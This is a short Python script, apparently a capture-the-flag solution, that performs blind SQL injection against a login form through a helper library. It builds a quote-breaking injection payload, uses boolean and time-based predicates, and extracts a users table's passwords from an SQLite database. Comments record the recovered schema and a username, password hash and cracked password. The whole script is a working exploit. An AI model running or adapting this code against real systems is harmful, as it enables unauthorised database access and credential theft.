import yasqlit as ya
import datetime

def pPayload(p):
    sqli = f'trash" or ({p}) or "a"="b'
    return sqli

def boolPredicate(res):
    if 'Incorrect Password' in res.text:
        return True
    else:
        return False

def timePredicate(res):
    if res.elapsed > datetime.timedelta(seconds=1):
        return True
    else:
        return False

def pwn():
    # t = ya.Transport(payloadProcessor=pPayload, predicate=boolPredicate, requestPath='req.login')
    t = ya.Transport(payloadProcessor=pPayload, predicate=timePredicate, requestPath='req.login')
    
    # qry = ya.templates['sqlite']['select']['version']
    # res = ya.boolExfiltrate(t, qry, 'sqlite')
    
    # qry = ya.templates['sqlite']['select']['tables']
    # ['users', 'notes', 'bookings', 'sessions']
    # qry = ya.templates['sqlite']['select']['columns'].replace('{table}', 'users')
    # ['CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active TINYINT(1))']
    # qry = "SELECT username FROM users"
    qry = "SELECT password FROM users"
    # RickA:fdc8cd4cff2c19e0d1022e78481ddf36 (nevergonnagiveyouup)

    # res = ya.boolExfiltrateList(t, qry, 'sqlite')
    res = ya.boolExfiltrateList(t, qry, 'sqlite', timeBasedDelay=2)

    print(res)


pwn()